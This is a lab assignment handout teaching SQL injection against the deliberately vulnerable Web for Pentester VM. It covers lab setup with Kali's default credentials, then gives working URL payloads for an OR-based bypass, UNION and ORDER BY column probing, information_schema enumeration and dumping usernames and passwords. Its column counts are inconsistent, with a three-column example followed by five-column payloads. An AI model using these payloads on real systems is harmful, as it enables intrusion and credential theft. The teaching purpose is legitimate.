# **SQL Injection Lab Assignment**  

### **Prerequisite**: Installation of Web for Pentester  
Before starting the lab, ensure that you have **Web for Pentester** installed on your system. Follow these steps to install it on Kali Linux:  

---

## **Installation Instructions**  

### **Kali Linux Credentials**:  
- **Username**: root  
- **Password**: toor  

### **Network Configuration**:  
1. Ensure that all systems are on the same network.  
2. If you are using your own equipment, **do not use a bridge connection**. This would place the system directly on the network your workstation is attached to.  

### **Mount the Web for Pentester ISO**:  
1. **Stop the LiveISO server** (Power OFF).  
2. Click on **Mount CDROM**.  
3. Select the appropriate options as shown in your installation guide (screenshots can be provided if needed).  

### **Boot to the Web for Pentester ISO**:  
1. Start the LiveISO server and boot from the Web for Pentester ISO file (**no login required**).  

### **Determine the IP Address**:  
Once the system boots, determine the IP address of the Pentester Lab system and record it here:  
**IP Address**: ______  

---

## **Objective**  
This lab aims to help students understand **SQL injection vulnerabilities**, how they can be exploited, and the impact of these attacks on database-driven applications.  

---

## **Using Kali Linux (or Another Server) as a Client**  

### **1. Open a Terminal**  
Launch a terminal in your Kali Linux environment.  

### **2. Determine Your Network Configuration**  
Ensure that your Kali Linux (or any other server) is connected to the same network as the Web for Pentester ISO server.  

### **3. Ping the ISO Server**  
Use the `ping` command to confirm connectivity:  
```bash
ping <Pentester Lab IP Address>
```  

### **4. Access the Web Application**  
1. Open **Firefox** (or any web browser) in your Kali Linux environment:  
   ```
   firefox &
   ```  
2. In the address bar, enter the IP address of the Pentester Lab server:  
   ```http://<Pentester Lab IP Address>```  

### **5. Start Exploring**  
Familiarize yourself with the web application hosted on the ISO server. This will be your **testing ground** for SQL injection techniques.  

---

## **SQL Injection Techniques**  

### **Example 1: Basic SQL Injection Using `OR`**  

#### **Expected SQL Query**:  
**Original Query**:  
```
SELECT id, name, age FROM table WHERE name='root'
```  
**Injected Query**:  
```
SELECT id, name, age FROM table WHERE name='root' OR '1'='1'
```  
**Result**: This returns all records in the table.  

#### **Payload/URL Format**:  
**Payload with URL encoding**:  
```
uri?name=root' OR '1'='1' %23
```  
**Expected SQL**:  
```
SELECT id, name, age FROM table WHERE name='root' OR '1'='1' #'
```  

---

### **Example 2: Using `UNION SELECT` to Combine Queries**  

#### **Injected URL**:  
**Payload**:  
```
url?name=root' UNION SELECT null %23
```  
**Expected SQL**:  
```
SELECT id, name, age FROM table WHERE name='root' UNION SELECT null #'
```  
**Result**: This returns nothing because the column numbers must match.  

#### **Determining Column Numbers**:  
- **Testing with Nulls**:  
  ```
  SELECT id, name, age FROM table WHERE name='root' UNION SELECT null, null, null %23
  ```  
- **Testing with More Columns**:  
  ```
  SELECT id, name, age FROM table WHERE name='root' UNION SELECT null, null, null, null, null %23
  ```  
- **Successful Injection**: After determining the number of columns, students can inject real data:  
  ```
  SELECT id, name, age FROM table WHERE name='root' UNION SELECT 1, 'goksel', 30
  ```  

---

### **Example 3: Using `ORDER BY` to Find Column Numbers**  

#### **Testing Column Numbers**:  
- **Invalid Column**:  
  ```
  url?name=root' ORDER BY 6 %23
  ```  
- **Valid Column**:  
  ```
  url?name=root' ORDER BY 5 %23
  ```  

---

### **Example 4: Extracting System Database Information**  

#### **Querying Database Version**:  
**Payload**:  
```
url?name=root' UNION SELECT 1, version(), 3, 4, 5 %23
```  
**Expected SQL**:  
```
SELECT id, name, age FROM table WHERE name='root' UNION SELECT 1, version(), 3, 4, 5 #'
```  

#### **Getting Database Name**:  
**Payload**:  
```
url?name=root' UNION SELECT 1, database(), 3, 4, 5 %23
```  

#### **Querying Table Information**:  
**Payload for Tables**:  
```
url?name=root' UNION SELECT table_name, 2, 3, 4, 5 FROM information_schema.tables WHERE table_schema=database() %23
```  

#### **Querying Column Information**:  
**Payload for Columns**:  
```
url?name=root' UNION SELECT column_name, 2, 3, 4, 5 FROM information_schema.columns WHERE table_name='users' %23
```  

#### **Extracting User Credentials**:  
**Injected URL**:  
```
url?name=root' UNION SELECT name, passwd, 3, 4, 5 FROM users %23
```  
